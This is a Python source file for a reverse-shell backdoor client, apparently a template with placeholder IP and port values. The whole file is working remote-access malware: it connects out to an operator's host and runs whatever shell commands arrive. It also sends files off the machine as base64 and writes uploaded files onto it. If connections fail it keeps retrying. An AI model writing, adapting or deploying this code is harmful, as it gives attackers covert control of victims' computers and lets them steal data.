import socket
import subprocess
import time
import json
import os
import base64

class Connection:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def command_execution(self, command):
        try:
            output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)

        except subprocess.CalledProcessError as e:
            output = e.output

        return output

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(2048).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_cd_command(self, directory):
        try:
            os.chdir(directory)
            result = f"Changed directory to {os.getcwd()}"
        except Exception as e:
            result = str(e)
        return result

    def get_file_contents(self, path):
        try:
            with open(path, "rb") as my_file:
                content = base64.b64encode(my_file.read()).decode("utf-8")
            return content
        
        except Exception as e:
            return str(e)

    def save_file(self, path, content):
        try:
            with open(path, "wb") as my_file:
                my_file.write(base64.b64decode(content.encode("utf-8")))

            return "Download Successful"
        
        except Exception as e:
            return str(e)
        
    def connect(self):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.ip, self.port))
            while True:
                command = self.json_receive()
                try:
                    if command[0] == "quit":
                        self.connection.close()
                        return
                    elif command[0] == "cd" and len(command) > 1:
                        command_output = self.execute_cd_command(command[1])

                    elif command[0] == "download":
                        command_output = self.get_file_contents(command[1])

                    elif command[0] == "upload":
                        command_output = self.save_file(command[1], command[2])

                    else:
                        command_output = self.command_execution(command)

                except Exception as e:
                    command_output = str(e)

                self.json_send(command_output)
                    
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError, ConnectionError) as e:
            print(e)
            time.sleep(1)
            self.connect()

if __name__ == "__main__":
    connection = Connection("{ip}", {port})
    connection.connect()